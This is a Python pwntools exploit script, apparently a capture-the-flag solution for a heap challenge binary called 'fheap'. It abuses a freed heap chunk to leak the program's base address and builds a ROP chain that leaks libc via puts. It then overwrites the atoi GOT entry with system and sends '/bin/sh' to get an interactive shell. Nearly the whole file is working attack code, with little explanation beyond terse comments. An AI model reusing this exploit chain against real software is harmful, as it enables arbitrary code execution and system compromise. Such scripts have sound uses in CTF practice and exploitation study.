from pwn import *

DEBUG = 0
REMOTE = 0 
haslibc = 0
pc = './fheap'

if DEBUG == 1:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

if REMOTE == 1:
    p = remote('127.0.0.1',1234)
else:
    elf = ELF(pc)
    if haslibc == 0:
        p = process(pc)
    else:
        p = process(pc,env = {'LD_PRELOAD':'./libc.so.6'}) 
        libc = ELF("./libc.so.6")

def create(content):
    p.recvuntil('quit\n')
    p.sendline("create ")
    p.recvuntil("size:")
    p.sendline(str(len(content)))
    p.recvuntil("str:")
    p.send(content)

def delete(id):
    p.recvuntil("quit\n")
    p.sendline("delete ")
    p.recvuntil("id:")
    p.sendline(str(id))
    p.recvuntil("sure?:")
    p.sendline("yes")

# leak failed,bacase when printf is called,the rax should be set zero,or will go to fail. 
def leak(addr):
    delete(0)
    data = 'aa%10$s' + '#' * (0x18 - len('aa%10$s')) + '\x91'
    create(data)
    p.recvuntil('quit\n')
    p.sendline('delete ')
    p.recvuntil('id:')
    p.sendline(str(1))
    raw_input("go!>")
    p.recvuntil('sure?:')
    p.send('yes01234' + p64(addr))
    raw_input("go!!>")
    p.recvuntil('aa')
    data = p.recvuntil('####')[:-4]
    data += '\x00'
    return data



def hack():
    #gdb.attach(p)
    global print_plt
    global proc_base
    create('a' * 8) # 0
    create('a' * 8) # 1
    delete(1)
    delete(0)
    #raw_input("go>")
    # leak 
    payload = 'z' * 0x14 + 'abcd' + '\x0b' #call puts
    # payload = 'z' * 0x14 + 'abcd' + '\x91' # call printf
    create(payload) # 0
    delete(1)
    p.recvuntil('abcd',drop = True)
    data = p.recvline() 
    #raw_input('gogo>')
    proc_base = u64(data[:-1].ljust(8,'\x00')) - 0xd0b
    print_plt = proc_base + 0x9a0
    #log.info("get print_plt address:" + hex(print_plt))
    log.success("get process base address:" + hex(proc_base))

    #d = DynELF(leak, proc_base, elf)
    #system = d.lookup('system','libc')

    # use rop:puts(puts_got),read(0,atoi_got,8),delete
    use_rop = 1
    if use_rop:
        delete(0)
        ropchain = p64(proc_base + 0x11d3) # pop rdi
        ropchain += p64(proc_base + 0x202030) # puts_got
        ropchain += p64(proc_base + 0x960) # puts_plt 
        ropchain += p64(proc_base + 0x11ca) # pop rbx,rbp,r12-15
        ropchain += p64(0) # rbx
        ropchain += p64(1) # rbp(read_plt)
        ropchain += p64(proc_base + 0x202058) # r12(read_got)
        ropchain += p64(8) # r13
        ropchain += p64(proc_base + 0x202070) # r13(atoi_got)
        ropchain += p64(0) # r15
        ropchain += p64(proc_base + 0x11b0) # call [r12]
        ropchain += 8 * 'a' + 6 * 8 * 'b' + p64(proc_base + 0xd70) # call atoi
        pop_r12_15 = p64(proc_base + 0x11cc)
        print hex(u64(pop_r12_15))
        payload = 'x' * 0x14 + '1234' + pop_r12_15[:2] # pop r12-15
        create(payload) # 0
        # trigger rop
        p.recvuntil("quit\n")
        p.sendline("delete ")
        p.recvuntil("id:")
        p.sendline('1')
        p.recvuntil("sure?:")
        payload = 'yes' + '12345' + ropchain
        p.sendline(payload)
        puts = u64(p.recvline()[:-1].ljust(8,'\x00'))
        system = puts + -0x2a300
        log.success("get system address:" + hex(system))
        p.send(p64(system))
        p.recvuntil('id:')
        p.sendline('/bin/sh')

    #raw_input("go>")
    p.interactive() 

hack()
